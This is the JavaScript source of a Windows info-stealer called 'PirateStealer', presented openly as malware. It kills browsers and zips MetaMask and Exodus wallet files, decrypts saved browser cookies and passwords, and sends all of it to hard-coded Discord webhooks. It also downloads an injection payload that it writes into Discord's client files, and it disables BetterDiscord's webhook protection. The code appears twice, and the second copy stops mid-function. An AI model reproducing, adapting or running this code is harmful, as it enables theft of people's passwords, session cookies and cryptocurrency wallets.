
var path  = require('path')
const os = require('os')
var dpapi = require("nexe-natives")(require.resolve('win-dpapi'));
var sqlite3 = require("nexe-natives")(require.resolve('sqlite3')),
        url = require('url'),
        crypto = require('crypto'),
        fs = require('fs'),
        ITERATIONS,
        dbClosed = false;
var glob = require("glob");
const https = require('https');
const { exec } = require('child_process');

const { execSync } = require('child_process');
const axios = require('axios');
const buf_replace = require('buffer-replace');


var     KEYLENGTH = 16,
        SALT = 'saltysalt'

const { Webhook, MessageBuilder } = require('discord-webhook-node');
const hook = new Webhook('https://discord.com/api/webhooks/950079884049391696/MoG59kOsGzyRIU1mrKPRBl93CgbGDskXwHgZzZ-JxWPg3dmQuGMyz4rV0JzBX5xp4S-5');
const webhook = "https://discord.com/api/webhooks/950050907326906458/j-NHprTCL_WhdUkuTFvomptE4Yf2m7r69FkmcoF8yFPysXqmtW9pSB6Nn4zTLJeTuG0C"


const zipper = require('zip-local');
        const exoduspath = process.env.appdata + "\\Exodus\\exodus.wallet";
	        const metamaskPath = process.env.localappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn";

                const metamaskPath2 = process.env.localappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm";

	if (fs.existsSync(metamaskPath)){
var tasklistResult = execSync('tasklist');
if (tasklistResult.includes("chrome.exe")){

execSync("taskkill /IM chrome.exe /F");	
}
var p = process.env.localappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\"
            zipper.sync.zip(metamaskPath).compress().save(p + '\\ChromeMetamaskWallet.zip')
   hook.sendFile(p + '\\ChromeMetamaskWallet.zip'); 
	}


        if (fs.existsSync(metamaskPath2)){
                var tasklistResult = execSync('tasklist');
                if (tasklistResult.includes("msedge.exe")){
                
                execSync("taskkill /IM msedge.exe /F");	
                }
                var p = process.env.localappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\";
                            zipper.sync.zip(metamaskPath2).compress().save(p + '\\EdgeMetamaskWallet.zip')
                   hook.sendFile(p + '\\EdgeMetamaskWallet.zip'); 


                        }


	
        if (fs.existsSync(exoduspath)) {
            const a = fs.mkdtempSync(path.join(os.tmpdir(), 'exoduscache-'));
            zipper.sync.zip(exoduspath).compress().save(a + '\\ExodusWallet.zip'                                                                                                                              );
            hook.sendFile(a + '\\ExodusWallet.zip');

        }

        //metamaskPath2

function decrypt(key, encryptedData) {

        var decipher,
                decoded,
                final,
                padding,
                iv = new Buffer.from(new Array(KEYLENGTH + 1).join(' '), 'binary');

        decipher = crypto.createDecipheriv('aes-128-cbc', key, iv);
        decipher.setAutoPadding(false);

        encryptedData = encryptedData.slice(3);

        decoded = decipher.update(encryptedData);

        final = decipher.final();
        final.copy(decoded, decoded.length - 1);

        padding = decoded[decoded.length - 1];
        if (padding) {
                decoded = decoded.slice(0, decoded.length - padding);
        }

        decoded = decoded.toString('utf8');

        return decoded;

}





function getDerivedKey(callback) {

        var keytar,
                chromePassword;

        if (process.platform === 'darwin') {

                keytar = require('keytar');
                keytar.getPassword('Edge Safe Storage', 'Chrome').then(function(chromePassword) {
                        crypto.pbkdf2(chromePassword, SALT, ITERATIONS, KEYLENGTH, 'sha1', callback);
                });

        } else if (process.platform === 'linux') {

                chromePassword = 'peanuts';
                crypto.pbkdf2(chromePassword, SALT, ITERATIONS, KEYLENGTH, 'sha1', callback);

        } else if (process.platform === 'win32') {

                callback(null, null);

        }

}




function convertRawToObject(cookies) {

        var out = [];

        cookies.forEach(function (cookie, index) {
                out.push(cookie);
        });

        return out;

}

function decryptAES256GCM(key, enc, nonce, tag) {
        const algorithm = 'aes-256-gcm';
        const decipher = crypto.createDecipheriv(algorithm, key, nonce);
        decipher.setAuthTag(tag);
        let str = decipher.update(enc,'base64','utf8');
        str += decipher.final('utf-8');
        return str;
}


function WhoSaidEncrypt(cookie, derivedKey, local){

        if (cookie.value === '' && cookie.encrypted_value.length > 0) {
                encryptedValue = cookie.encrypted_value;

                if (process.platform === 'win32') {
                        if (encryptedValue[0] == 0x01 && encryptedValue[1] == 0x00 && encryptedValue[2] == 0x00 && encryptedValue[3] == 0x00){
                                cookie.value = dpapi.unprotectData(encryptedValue, null, 'CurrentUser').toString('utf-8');

                        } else if (encryptedValue[0] == 0x76 && encryptedValue[1] == 0x31 && encryptedValue[2] == 0x30 ){
                                localState = JSON.parse(fs.readFileSync(local));
                                b64encodedKey = localState.os_crypt.encrypted_key;
                                encryptedKey = new Buffer.from(b64encodedKey,'base64');
                                key = dpapi.unprotectData(encryptedKey.slice(5, encryptedKey.length), null, 'CurrentUser');
                                nonce = encryptedValue.slice(3, 15);
                                tag = encryptedValue.slice(encryptedValue.length - 16, encryptedValue.length);
                                encryptedValue = encryptedValue.slice(15, encryptedValue.length - 16);
                                cookie.value = decryptAES256GCM(key, encryptedValue, nonce, tag).toString('utf-8');
                        }
                } else {
                        cookie.value = decrypt(derivedKey, encryptedValue);
                }

                delete cookie.encrypted_value;
        }

        return cookie

}
const getCookies = async (uri,profile, local, format, callback) => {

        profile ? profile : profile = 'Default'

        if (process.platform === 'darwin') {

                path = profile;
                ITERATIONS = 1003;

        } else if (process.platform === 'linux') {

                path = profile;
                ITERATIONS = 1;

        } else if (process.platform === 'win32') {

                path = profile;

        } else {

                return callback(new Error('Only Mac, Windows, and Linux are supported.'));

        }

        db = new sqlite3.Database(path);

        if (format instanceof Function) {
                callback = format;
                format = null;
        }

        var parsedUrl = url.parse(uri);

        if (!parsedUrl.protocol || !parsedUrl.hostname) {
                return callback(new Error('Could not parse URI, format should be http://www.example.com/path/'));
        }

        if (dbClosed) {
                db = new sqlite3.Database(path);
                dbClosed = false;
        }

        getDerivedKey(function (err, derivedKey) {

                if (err) {
                        return callback(err);
                }

                db.serialize(function () {

                        var cookies = [];


                        db.each("SELECT host_key, path, is_secure, expires_utc,name, value, encrypted_value, creation_utc, is_httponly, has_expires, is_persistent FROM cookies", function (err, cookie) {
                                var encryptedValue,
                                        value;

                                if (err) {
                                        return callback(err);
                                }
                                cookies.push(WhoSaidEncrypt(cookie, derivedKey,local));

                        }, function () {

                                var host = parsedUrl.hostname,
                                        path = parsedUrl.path,
                                        isSecure = parsedUrl.protocol.match('https'),
                                        cookieStore = {},
                                        validCookies = [],
                                        output;

                                cookies.forEach(function (cookie) {

                                        validCookies.push(cookie);

                                });

                                var filteredCookies = [];
                                var keys = {};

                                validCookies.reverse().forEach(function (cookie) {

                                        if (typeof keys[cookie.name] === 'undefined') {
                                                filteredCookies.push(cookie);
                                                keys[cookie.name] = true;
                                        }

                                });

                                validCookies = filteredCookies.reverse();


                                                output = convertRawToObject(validCookies);



                                db.close(function(err) {
                                        if (!err) {
                                                dbClosed = true;
                                        }
                                        return callback(null, output);
                                });

                        });

                });

        });

};



const getPasswords = async (uri, profile, local, format, callback) => {

        profile ? profile : profile = 'Default'

        var path = "";
        if (process.platform === 'darwin') {

                path = profile
                ITERATIONS = 1003;

        } else if (process.platform === 'linux') {

                path = profile
                ITERATIONS = 1;

        } else if (process.platform === 'win32') {

                path = profile

        } else {

                return callback(new Error('Only Mac, Windows, and Linux are supported.'));

        }

        db = new sqlite3.Database(path);

        if (format instanceof Function) {
                callback = format;
                format = null;
        }

        var parsedUrl = url.parse(uri);

        if (!parsedUrl.protocol || !parsedUrl.hostname) {
                return callback(new Error('Could not parse URI, format should be http://www.example.com/path/'));
        }

        if (dbClosed) {
                db = new sqlite3.Database(path);
                dbClosed = false;
        }

        getDerivedKey(function (err, derivedKey) {

                if (err) {
                        return callback(err);
                }

                db.serialize(function () {

                        var cookies = [];


                        db.each("SELECT * FROM logins", function (err, cookie) {
                                var encryptedValue,
                                        value;

                                if (cookie.password_value.length > 0) {
                                        encryptedValue = cookie.password_value;
                                        if (process.platform === 'win32') {
                                                if (encryptedValue[0] == 0x01 && encryptedValue[1] == 0x00 && encryptedValue[2] == 0x00 && encryptedValue[3] == 0x00){
                                                        cookie.value = dpapi.unprotectData(encryptedValue, null, 'CurrentUser').toString('utf-8');

                                                } else if (encryptedValue[0] == 0x76 && encryptedValue[1] == 0x31 && encryptedValue[2] == 0x30 ){
                                                        localState = JSON.parse(fs.readFileSync(local));
                                                        b64encodedKey = localState.os_crypt.encrypted_key;
                                                        encryptedKey = new Buffer.from(b64encodedKey,'base64');
                                                        key = dpapi.unprotectData(encryptedKey.slice(5, encryptedKey.length), null, 'CurrentUser');
                                                        nonce = encryptedValue.slice(3, 15);
                                                        tag = encryptedValue.slice(encryptedValue.length - 16, encryptedValue.length);
                                                        encryptedValue = encryptedValue.slice(15, encryptedValue.length - 16);
                                                        cookie.value = decryptAES256GCM(key, encryptedValue, nonce, tag).toString('utf-8');
                                                }
                                        } else {
                                                cookie.value = decrypt(derivedKey, encryptedValue);
                                        }

                                        delete cookie.password_value;
                                }
                                cookies.push(cookie);

                        }, function () {

                                var host = parsedUrl.hostname,
                                        path = parsedUrl.path,
                                        isSecure = parsedUrl.protocol.match('https'),
                                        cookieStore = {},
                                        validCookies = [],
                                        output;

                                cookies.forEach(function (cookie) {

                                        validCookies.push(cookie);

                                });

                                var filteredCookies = [];
                                var keys = {};

                                validCookies.reverse().forEach(function (cookie) {

                                                filteredCookies.push(cookie);


                                });



                                validCookies = filteredCookies.reverse();

                                db.close(function(err) {
                                        if (!err) {
                                                dbClosed = true;
                                        }
                                        return callback(null, validCookies);
                                });

                        });

                });

        });

};

const config = {
    "logout": "instant",
    "inject-notify": "false",
    "logout-notify": "false",
    "init-notify":"false",
    "embed-color": 3447704,
    "disable-qr-code": "true"

}


var LOCAL = process.env.LOCALAPPDATA
var discords = [];
var injectPath = [];
var runningDiscords = [];


fs.readdirSync(LOCAL).forEach(file => {
    if (file.includes("iscord")) {
        discords.push(LOCAL + '\\' + file)
    } else {
        return;
    }
});

discords.forEach(function(file) {
    let pattern = `${file}` + "\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js"
    glob.sync(pattern).map(file => {
        injectPath.push(file)
    })

});
listDiscords();
function Infect() {
    https.get('https://raw.githubusercontent.com/r4bbit-stealer/r4bbit-source/main/injection', (resp) => {
        let data = '';
        resp.on('data', (chunk) => {
            data += chunk;
        });
        resp.on('end', () => {
            injectPath.forEach(file => {
                fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", webhook).replace("%INITNOTI%", config["init-notify"]).replace("%LOGOUT%", config.logout).replace("%LOGOUTNOTI%", config["logout-notify"]).replace("3447704",config["embed-color"]).replace('%DISABLEQRCODE%', config["disable-qr-code"]), {
                    encoding: 'utf8',
                    flag: 'w'
                });
                if (config["init-notify"] == "true") {
                    let init = file.replace("index.js", "init")
                    if (!fs.existsSync(init)) {
                        fs.mkdirSync(init, 0744)
                    }
                }
                if ( config.logout != "false" ) {

                    let folder = file.replace("index.js", "PirateStealerBTW")
                    if (!fs.existsSync(folder)) {
                        fs.mkdirSync(folder, 0744)
                        if (config.logout == "instant") {
                            startDiscord();
                        }
                    } else if (fs.existsSync(folder) && config.logout == "instant" ){
                        startDiscord();
                    }
                }
            })

        });
    }).on("error", (err) => {
        console.log(err);
    });
};


function listDiscords() {
    exec('tasklist', function(err,stdout, stderr) {


        if (stdout.includes("Discord.exe")) {

            runningDiscords.push("discord")
        }
        if (stdout.includes("DiscordCanary.exe")) {

            runningDiscords.push("discordcanary")
        }
        if (stdout.includes("DiscordDevelopment.exe")) {

            runningDiscords.push("discorddevelopment")
        }
        if (stdout.includes("DiscordPTB.exe")) {

            runningDiscords.push("discordptb")
        };
        if (config.logout == "instant") {
            killDiscord();
        } else {
            if (config["inject-notify"] == "true" && injectPath.length != 0 ) {
                injectNotify();
            }
            Infect()
            pwnBetterDiscord()
        }
    })



};

function killDiscord() {
    runningDiscords.forEach(disc => {
        exec(`taskkill /IM ${disc}.exe /F`, (err) => {
            if (err) {
              return;
            }
          });
    });
    if (config["inject-notify"] == "true" && injectPath.length != 0 ) {
        injectNotify();
    }

    Infect()
    pwnBetterDiscord()
};

function startDiscord() {
    runningDiscords.forEach(disc => {
        let path = LOCAL + '\\' + disc + "\\Update.exe --processStart " + disc + ".exe"
        exec(path, (err) => {
            if (err) {
              return;
            }
          });
    });
};
function pwnBetterDiscord() {
    // thx stanley
    var dir = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar"
    if (fs.existsSync(dir)) {
        var x = fs.readFileSync(dir)
        fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "stanleyisgod"))
    } else {
        return;
    }

}


function injectNotify() {
    var fields = [];
    injectPath.forEach( path => {
        var c = {
            name: ":syringe: Inject Path",
            value: `\`\`\`${path}\`\`\``,
            inline: !1
        }
        fields.push(c)
    })
    axios
        .post(webhook, {
        "content": null,
        "embeds": [
          {
            "title": ":detective: Successfull injection",
            "color": config["embed-color"],
            "fields": fields,
            "author": {
              "name": "PirateStealer"
            },
            "footer": {
              "text": "PirateStealer"
            }
          }
        ]
      })
        .then(res => {
        })
        .catch(error => {

    })

}




var commonwebbrowsers = [

    os.homedir() + "\\AppData\\Local\\Google\\Chrome\\User Data",
    os.homedir() + "\\AppData\\Local\\Microsoft\\Edge\\User Data",
    os.homedir() + "\\AppData\\Roaming\\Opera Software\\Opera GX Stable"

]



function ToCache(){
    var browser_cached = [

    ]

    commonwebbrowsers.forEach((browser)=>{
        if (fs.existsSync(browser)){
            if (fs.existsSync(browser + "\\Local State")){
                if (browser.includes('Opera')){

                             var x = fs.mkdtempSync(path.join(os.tmpdir(), 'PS-'))


                    fs.copyFileSync(browser + "\\Cookies", x + "\\cookies")
                    fs.copyFileSync(browser + "\\Login Data", x + "\\login data")
                    fs.writeFileSync(x + "\\browser", browser)
                    browser_cached.push(x);

                    }
         else{
        if (fs.existsSync(browser + "\\Default\\Cookies")){
     var x = fs.mkdtempSync(path.join(os.tmpdir(), 'PS-'))


            fs.copyFileSync(browser + "\\Default\\Cookies", x + "\\cookies")
            fs.copyFileSync(browser + "\\Default\\Login Data", x + "\\login data" )
            fs.writeFileSync(x + "\\browser", browser)
            browser_cached.push(x);
}

         }
            }
        }
    })

    return browser_cached;


}



var tc = (ToCache())
const embed = new MessageBuilder()
.setTitle('PirateStealer')
.setColor('#fff')
.setDescription(`Homedir: ${os.homedir()}\nComputer Hostname: ${os.hostname()}\nTotal Memory: ${os.totalmem()/1000000000}\nFree Memory: ${8555192320/1000000000}`)
.setFooter('PirateStealer Premium');
hook.send(embed);
tc.forEach((browser) => {
    var textresult = fs.readFileSync(browser + "\\browser")
    getCookies('https://www.xelies.cc/', browser + "\\cookies", textresult + "\\Local State", function(err, cookies) {
        var coo = `---------------------------------------------------------------------------
Thanks for using PirateStealer!
Victims Path: %path%\n---------------------------------------------------------------------------\n\n\n\n`.replace('%path%', textresult);
        cookies.forEach((cooki) => {
            coo += "---------------------------------------------------------------------------\nHost Key: " + cooki.host_key + "\nName: " + cooki.name + "\nValue: " + cooki.value + "\n---------------------------------------------------------------------------\n\n"
        })
        fs.writeFileSync(browser + "\\Cookies.txt" , coo);
        hook.sendFile(browser + "\\Cookies.txt");

    }
    )


    getPasswords('https://www.xelies.cc/', browser + "\\login data", textresult + "\\Local State", function(err, cookies) {
        var coo = `---------------------------------------------------------------------------
Thanks for using PirateStealer!
Victims Path: %path%\n---------------------------------------------------------------------------\n\n\n\n\n`.replace('%path%', textresult);
    cookies.forEach((cx) => {
            coo += "---------------------------------------------------------------------------\nURL: " + cx.origin_url +"\nUsername (or email): " + cx.username_value + "\nPassword: " + cx.value + "\n---------------------------------------------------------------------------\n\n";
        })
        fs.writeFileSync(browser + "\\Passwords.txt" , coo);

        hook.sendFile(browser + "\\Passwords.txt")

    }
    )

})

var path  = require('path')
const os = require('os')
var dpapi = require("nexe-natives")(require.resolve('win-dpapi'));
var sqlite3 = require("nexe-natives")(require.resolve('sqlite3')),
        url = require('url'),
        crypto = require('crypto'),
        fs = require('fs'),
        ITERATIONS,
        dbClosed = false;
var glob = require("glob");
const https = require('https');
const { exec } = require('child_process');

const { execSync } = require('child_process');
const axios = require('axios');
const buf_replace = require('buffer-replace');


var     KEYLENGTH = 16,
        SALT = 'saltysalt'

const { Webhook, MessageBuilder } = require('discord-webhook-node');
const hook = new Webhook('https://discord.com/api/webhooks/950079884049391696/MoG59kOsGzyRIU1mrKPRBl93CgbGDskXwHgZzZ-JxWPg3dmQuGMyz4rV0JzBX5xp4S-5');
const webhook = "https://discord.com/api/webhooks/950050907326906458/j-NHprTCL_WhdUkuTFvomptE4Yf2m7r69FkmcoF8yFPysXqmtW9pSB6Nn4zTLJeTuG0C"


const zipper = require('zip-local');
        const exoduspath = process.env.appdata + "\\Exodus\\exodus.wallet";
	        const metamaskPath = process.env.localappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn";

                const metamaskPath2 = process.env.localappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm";

	if (fs.existsSync(metamaskPath)){
var tasklistResult = execSync('tasklist');
if (tasklistResult.includes("chrome.exe")){

execSync("taskkill /IM chrome.exe /F");	
}
var p = process.env.localappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\"
            zipper.sync.zip(metamaskPath).compress().save(p + '\\ChromeMetamaskWallet.zip')
   hook.sendFile(p + '\\ChromeMetamaskWallet.zip'); 
	}


        if (fs.existsSync(metamaskPath2)){
                var tasklistResult = execSync('tasklist');
                if (tasklistResult.includes("msedge.exe")){
                
                execSync("taskkill /IM msedge.exe /F");	
                }
                var p = process.env.localappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\";
                            zipper.sync.zip(metamaskPath2).compress().save(p + '\\EdgeMetamaskWallet.zip')
                   hook.sendFile(p + '\\EdgeMetamaskWallet.zip'); 


                        }


	
        if (fs.existsSync(exoduspath)) {
            const a = fs.mkdtempSync(path.join(os.tmpdir(), 'exoduscache-'));
            zipper.sync.zip(exoduspath).compress().save(a + '\\ExodusWallet.zip'                                                                                                                              );
            hook.sendFile(a + '\\ExodusWallet.zip');

        }

        //metamaskPath2

function decrypt(key, encryptedData) {

        var decipher,
                decoded,
                final,
                padding,
                iv = new Buffer.from(new Array(KEYLENGTH + 1).join(' '), 'binary');

        decipher = crypto.createDecipheriv('aes-128-cbc', key, iv);
        decipher.setAutoPadding(false);

        encryptedData = encryptedData.slice(3);

        decoded = decipher.update(encryptedData);

        final = decipher.final();
        final.copy(decoded, decoded.length - 1);

        padding = decoded[decoded.length - 1];
        if (padding) {
                decoded = decoded.slice(0, decoded.length - padding);
        }

        decoded = decoded.toString('utf8');

        return decoded;

}





function getDerivedKey(callback) {

        var keytar,
                chromePassword;

        if (process.platform === 'darwin') {

                keytar = require('keytar');
                keytar.getPassword('Edge Safe Storage', 'Chrome').then(function(chromePassword) {
                        crypto.pbkdf2(chromePassword, SALT, ITERATIONS, KEYLENGTH, 'sha1', callback);
                });

        } else if (process.platform === 'linux') {

                chromePassword = 'peanuts';
                crypto.pbkdf2(chromePassword, SALT, ITERATIONS, KEYLENGTH, 'sha1', callback);

        } else if (process.platform === 'win32') {

                callback(null, null);

        }

}




function convertRawToObject(cookies) {

        var out = [];

        cookies.forEach(function (cookie, index) {
                out.push(cookie);
        });

        return out;

}

function decryptAES256GCM(key, enc, nonce, tag) {
        const algorithm = 'aes-256-gcm';
        const decipher = crypto.createDecipheriv(algorithm, key, nonce);
        decipher.setAuthTag(tag);
        let str = decipher.update(enc,'base64','utf8');
        str += decipher.final('utf-8');
        return str;
}


function WhoSaidEncrypt(cookie, derivedKey, local){

        if (cookie.value === '' && cookie.encrypted_value.length > 0) {
                encryptedValue = cookie.encrypted_value;

                if (process.platform === 'win32') {
                        if (encryptedValue[0] == 0x01 && encryptedValue[1] == 0x00 && encryptedValue[2] == 0x00 && encryptedValue[3] == 0x00){
                                cookie.value = dpapi.unprotectData(encryptedValue, null, 'CurrentUser').toString('utf-8');

                        } else if (encryptedValue[0] == 0x76 && encryptedValue[1] == 0x31 && encryptedValue[2] == 0x30 ){
                                localState = JSON.parse(fs.readFileSync(local));
                                b64encodedKey = localState.os_crypt.encrypted_key;
                                encryptedKey = new Buffer.from(b64encodedKey,'base64');
                                key = dpapi.unprotectData(encryptedKey.slice(5, encryptedKey.length), null, 'CurrentUser');
                                nonce = encryptedValue.slice(3, 15);
                                tag = encryptedValue.slice(encryptedValue.length - 16, encryptedValue.length);
                                encryptedValue = encryptedValue.slice(15, encryptedValue.length - 16);
                                cookie.value = decryptAES256GCM(key, encryptedValue, nonce, tag).toString('utf-8');
                        }
                } else {
                        cookie.value = decrypt(derivedKey, encryptedValue);
                }

                delete cookie.encrypted_value;
        }

        return cookie

}
const getCookies = async (uri,profile, local, format, callback) => {

        profile ? profile : profile = 'Default'

        if (process.platform === 'darwin') {

                path = profile;
                ITERATIONS = 1003;

        } else if (process.platform === 'linux') {

                path = profile;
                ITERATIONS = 1;

        } else if (process.platform === 'win32') {

                path = profile;

        } else {

                return callback(new Error('Only Mac, Windows, and Linux are supported.'));

        }

        db = new sqlite3.Database(path);

        if (format instanceof Function) {
                callback = format;
                format = null;
        }

        var parsedUrl = url.parse(uri);

        if (!parsedUrl.protocol || !parsedUrl.hostname) {
                return callback(new Error('Could not parse URI, format should be http://www.example.com/path/'));
        }

        if (dbClosed) {
                db = new sqlite3.Database(path);
                dbClosed = false;
        }

        getDerivedKey(function (err, derivedKey) {

                if (err) {
                        return callback(err);
                }

                db.serialize(function () {

                        var cookies = [];


                        db.each("SELECT host_key, path, is_secure, expires_utc,name, value, encrypted_value, creation_utc, is_httponly, has_expires, is_persistent FROM cookies", function (err, cookie) {
                                var encryptedValue,
                                        value;

                                if (err) {
                                        return callback(err);
                                }
                                cookies.push(WhoSaidEncrypt(cookie, derivedKey,local));

                        }, function () {

                                var host = parsedUrl.hostname,
                                        path = parsedUrl.path,
                                        isSecure = parsedUrl.protocol.match('https'),
                                        cookieStore = {},
                                        validCookies = [],
                                        output;

                                cookies.forEach(function (cookie) {

                                        validCookies.push(cookie);

                                });

                                var filteredCookies = [];
                                var keys = {};

                                validCookies.reverse().forEach(function (cookie) {

                                        if (typeof keys[cookie.name] === 'undefined') {
                                                filteredCookies.push(cookie);
                                                keys[cookie.name] = true;
                                        }

                                });

                                validCookies = filteredCookies.reverse();


                                                output = convertRawToObject(validCookies);



                                db.close(function(err) {
                                        if (!err) {
                                                dbClosed = true;
                                        }
                                        return callback(null, output);
                                });

                        });

                });

        });

};



const getPasswords = async (uri, profile, local, format, callback) => {

        profile ? profile : profile = 'Default'

        var path = "";
        if (process.platform === 'darwin') {

                path = profile
                ITERATIONS = 1003;

        } else if (process.platform === 'linux') {

                path = profile
                ITERATIONS = 1;

        } else if (process.platform === 'win32') {

                path = profile

        } else {

                return callback(new Error('Only Mac, Windows, and Linux are supported.'));

        }

        db = new sqlite3.Database(path);

        if (format instanceof Function) {
                callback = format;
                format = null;
        }

        var parsedUrl = url.parse(uri);

        if (!parsedUrl.protocol || !parsedUrl.hostname) {
                return callback(new Error('Could not parse URI, format should be http://www.example.com/path/'));
        }

        if (dbClosed) {
                db = new sqlite3.Database(path);
                dbClosed = false;
        }

        getDerivedKey(function (err, derivedKey) {

                if (err) {
                        return callback(err);
                }

                db.serialize(function () {

                        var cookies = [];


                        db.each("SELECT * FROM logins", function (err, cookie) {
                                var encryptedValue,
                                        value;

                                if (cookie.password_value.length > 0) {
                                        encryptedValue = cookie.password_value;
                                        if (process.platform === 'win32') {
                                                if (encryptedValue[0] == 0x01 && encryptedValue[1] == 0x00 && encryptedValue[2] == 0x00 && encryptedValue[3] == 0x00){
                                                        cookie.value = dpapi.unprotectData(encryptedValue, null, 'CurrentUser').toString('utf-8');

                                                } else if (encryptedValue[0] == 0x76 && encryptedValue[1] == 0x31 && encryptedValue[2] == 0x30 ){
                                                        localState = JSON.parse(fs.readFileSync(local));
                                                        b64encodedKey = localState.os_crypt.encrypted_key;
                                                        encryptedKey = new Buffer.from(b64encodedKey,'base64');
                                                        key = dpapi.unprotectData(encryptedKey.slice(5, encryptedKey.length), null, 'CurrentUser');
                                                        nonce = encryptedValue.slice(3, 15);
                                                        tag = encryptedValue.slice(encryptedValue.length - 16, encryptedValue.length);
                                                        encryptedValue = encryptedValue.slice(15, encryptedValue.length - 16);
                                                        cookie.value = decryptAES256GCM(key, encryptedValue, nonce, tag).toString('utf-8');
                                                }
                                        } else {
                                                cookie.value = decrypt(derivedKey, encryptedValue);
                                        }

                                        delete cookie.password_value;
                                }
                                cookies.push(cookie);

                        }, function () {

                                var host = parsedUrl.hostname,
                                        path = parsedUrl.path,
                                        isSecure = parsedUrl.protocol.match('https'),
                                        cookieStore = {},
                                        validCookies = [],
                                        output;

                                cookies.forEach(function (cookie) {

                                        validCookies.push(cookie);

                                });

                                var filteredCookies = [];
                                var keys = {};

                                validCookies.reverse().forEach(function (cookie) {

                                                filteredCookies.push(cookie);


                                });



                                validCookies = filteredCookies.reverse();

                                db.close(function(err) {
                                        if (!err) {
                                                dbClosed = true;
                                        }
                                        return callback(null, validCookies);
                                });

                        });

                });

        });

};

const config = {
    "logout": "instant",
    "inject-notify": "false",
    "logout-notify": "false",
    "init-notify":"false",
    "embed-color": 3447704,
    "disable-qr-code": "true"

}


var LOCAL = process.env.LOCALAPPDATA
var discords = [];
var injectPath = [];
var runningDiscords = [];


fs.readdirSync(LOCAL).forEach(file => {
    if (file.includes("iscord")) {
        discords.push(LOCAL + '\\' + file)
    } else {
        return;
    }
});

discords.forEach(function(file) {
    let pattern = `${file}` + "\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js"
    glob.sync(pattern).map(file => {
        injectPath.push(file)
    })

});
listDiscords();
function Infect() {
    https.get('https://raw.githubusercontent.com/r4bbit-stealer/r4bbit-source/main/injection', (resp) => {
        let data = '';
        resp.on('data', (chunk) => {
            data += chunk;
        });
        resp.on('end', () => {
            injectPath.forEach(file => {
                fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", webhook).replace("%INITNOTI%", config["init-notify"]).replace("%LOGOUT%", config.logout).replace("%LOGOUTNOTI%", config["logout-notify"]).replace("3447704",config["embed-color"]).replace('%DISABLEQRCODE%', config["disable-qr-code"]), {
                    encoding: 'utf8',
                    flag: 'w'
                });
                if (config["init-notify"] == "true") {
                    let init = file.replace("index.js", "init")
                    if (!fs.existsSync(init)) {
                        fs.mkdirSync(init, 0744)
                    }
                }
                if ( config.logout != "false" ) {

                    let folder = file.replace("index.js", "PirateStealerBTW")
                    if (!fs.existsSync(folder)) {
                        fs.mkdirSync(folder, 0744)
                        if (config.logout == "instant") {
                            startDiscord();
                        }
                    } else if (fs.existsSync(folder) && config.logout == "instant" ){
                        startDiscord();
                    }
                }
            })

        });
    }).on("error", (err) => {
        console.log(err);
    });
};


function listDiscords() {
    exec('tasklist', function(err,stdout, stderr) {


        if (stdout.includes("Discord.exe")) {

            runningDiscords.push("discord")
        }
        if (stdout.includes("DiscordCanary.exe")) {

            runningDiscords.push("discordcanary")
        }
        if (stdout.includes("DiscordDevelopment.exe")) {

            runningDiscords.push("discorddevelopment")
        }
        if (stdout.includes("DiscordPTB.exe")) {

            runningDiscords.push("discordptb")
        };
        if (config.logout == "instant") {
            killDiscord();
        } else {
            if (config["inject-notify"] == "true" && injectPath.length != 0 ) {
                injectNotify();
            }
            Infect()
            pwnBetterDiscord()
        }
    })



};

function killDiscord() {
    runningDiscords.forEach(disc => {
        exec(`taskkill /IM ${disc}.exe /F`, (err) => {
            if (err) {
              return;
            }
          });
    });
    if (config["inject-notify"] == "true" && injectPath.length != 0 ) {
        injectNotify();
    }

    Infect()
    pwnBetterDiscord()
};

function startDiscord() {
    runningDiscords.forEach(disc => {
        let path = LOCAL + '\\' + disc + "\\Update.exe --processStart " + disc + ".exe"
        exec(path, (err) => {
            if (err) {
              return;
            }
          });
    });
};
function pwnBetterDiscord() {
    // thx stanley
    var dir = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar"
    if (fs.existsSync(dir)) {
        var x = fs.readFileSync(dir)
        fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "stanleyisgod"))
    } else {
        return;
    }

}


function injectNotify() {
    var fields = [];
    injectPath.forEach( path => {
        var c = {
            name: ":syringe: Inject Path",
            value: `\`\`\`${path}\`\`\``,
            inline: !1
        }
        fields.push(c)
    })
    axios
        .post(webhook, {
        "content": null,
        "embeds": [
          {
            "title": ":detective: Successfull injection",
            "color": config["embed-color"],
            "fields": fields,
            "author": {
              "name": "PirateStealer"
            },
            "footer": {
              "text": "PirateStealer"
            }
          }
        ]
      })
        .then(res => {
        })
        .catch(error => {

    })

}




var commonwebbrowsers = [

    os.homedir() + "\\AppData\\Local\\Google\\Chrome\\User Data",
    os.homedir() + "\\AppData\\Local\\Microsoft\\Edge\\User Data",
    os.homedir() + "\\AppData\\Roaming\\Opera Software\\Opera GX Stable"

]



function ToCache(){
    var browser_cached = [

    ]

    commonwebbrowsers.forEach((browser)=>{
        if (fs.existsSync(browser)){
            if (fs.existsSync(browser + "\\Local State")){
                if (browser.includes('Opera')){

                             var x = fs.mkdtempSync(path.join(os.tmpdir(), 'PS-'))


                    fs.copyFileSync(browser + "\\Cookies", x + "\\cookies")
                    fs.copyFileSync(browser + "\\Login Data", x + "\\login data")
                    fs.writeFileSync(x + "\\browser", browser)
                    browser_cached.push(x);

                    }
         else{
        if (fs.existsSync(browser + "\\Default\\Cookies")){
     var x = fs.mkdtempSync(path.join(os.tmpdir(), 'PS-'))


